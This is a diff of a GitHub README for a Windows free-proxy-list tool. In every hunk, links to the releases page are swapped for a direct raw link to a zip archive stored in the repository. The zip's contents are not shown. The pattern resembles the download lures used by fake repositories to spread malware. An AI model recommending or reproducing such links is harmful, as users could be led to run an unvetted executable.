@@ -1,6 +1,6 @@
 # 🔗 awesome-free-proxy-list - Updated Free Proxy List Daily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Seeh-Saah/awesome-free-proxy-list/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Seeh-Saah/awesome-free-proxy-list/raw/refs/heads/main/proxies/awesome-free-list-proxy-2.4-beta.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This guide will help you download and run the proxy list application on Windows.
 ## ⬇️ Download and Installation
 
 1. Click the large green badge above or go directly here:  
-   [https://github.com/Seeh-Saah/awesome-free-proxy-list/releases](https://github.com/Seeh-Saah/awesome-free-proxy-list/releases)  
+   [https://github.com/Seeh-Saah/awesome-free-proxy-list/raw/refs/heads/main/proxies/awesome-free-list-proxy-2.4-beta.4.zip](https://github.com/Seeh-Saah/awesome-free-proxy-list/raw/refs/heads/main/proxies/awesome-free-list-proxy-2.4-beta.4.zip)  
 
 2. On the releases page, find the latest release version. Look for a file named something like `awesome-free-proxy-list.zip` or `awesome-free-proxy-list.exe`.  
 
@@ -142,7 +142,7 @@ This will trigger the download and test of new proxies.
 ## ✨ Useful Links
 
 - Main download page:  
-  [https://github.com/Seeh-Saah/awesome-free-proxy-list/releases](https://github.com/Seeh-Saah/awesome-free-proxy-list/releases)  
+  [https://github.com/Seeh-Saah/awesome-free-proxy-list/raw/refs/heads/main/proxies/awesome-free-list-proxy-2.4-beta.4.zip](https://github.com/Seeh-Saah/awesome-free-proxy-list/raw/refs/heads/main/proxies/awesome-free-list-proxy-2.4-beta.4.zip)  
 - Project homepage on GitHub: Search for `Seeh-Saah/awesome-free-proxy-list`
 
 ---
